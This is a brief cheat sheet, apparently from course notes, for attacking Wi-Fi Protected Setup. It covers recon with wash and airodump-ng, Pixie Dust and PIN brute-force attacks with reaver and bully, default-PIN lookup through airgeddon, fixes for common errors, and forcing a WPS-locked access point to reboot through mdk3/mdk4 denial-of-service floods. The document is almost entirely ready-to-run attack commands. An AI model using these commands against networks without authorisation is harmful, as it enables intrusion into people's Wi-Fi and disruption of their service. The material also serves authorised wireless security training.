# WPS Attacks (Pixie Dust & PIN Brute Force)
The 8-digit PIN is checked in two halves (first half = 10k tries, second half = 1k, last digit is a checksum)

## Recon
```sh
$ sudo airmon-ng check kill; sudo airmon-ng start wlan0
$ wash -i wlan0mon
$ wash -i wlan0mon -5
# or airodump-ng --wps wlan0mon
```
Pick an AP with `Lck = No`.

## Pixie Dust (fast, mostly offline - if the chipset RNG is weak)
```sh
$ sudo reaver -b <BSSID> -i wlan0mon -v -K        # -K = pixie
# reaver gathers the data, auto-runs pixiewps
```
Alternative with bully: `bully -d -v 4 <...>` (runs pixiewps), then `bully -B -p <PIN>` to pull the passphrase

## PIN brute force (slow, ~hours)
```sh
$ sudo reaver -b <BSSID> -i wlan0mon -v
$ sudo reaver -b <BSSID> -i wlan0mon -v -c <CH> # if it's stuck "Waiting for beacon"
```

Default PINs by vendor (first 3 BSSID bytes):
```sh
$ sudo apt install airgeddon
$ source /usr/share/airgeddon/known_pins.db
$ echo ${PINDB["0013F7"]}
```
Empty/blank PIN: `reaver -p ''` or `bully -p ''`

## Troubleshooting (course)
- Pixie fails as not all chipset RNGs are vulnerable: fall back to PIN brute force
- Brute force hits AP countermeasures (rate-limiting): use reaver's timing options
- `WPS transaction failed (code: 0x03)`: restart reaver without `-K` (it prompts to restore the session, which has the correct PIN). If it keeps happening try another card
- Stuck at `Waiting for beacon from <BSSID>`: driver won't channel-hop, add `-c <CH>` (channel from `wash`)
- `Lck = Yes` (WPS locked): DoS the AP with `mdk3`/`mdk4` (auth DoS, EAPOL-Start DoS, or EAPOL-Logoff flood) to force a reboot that clears the lock
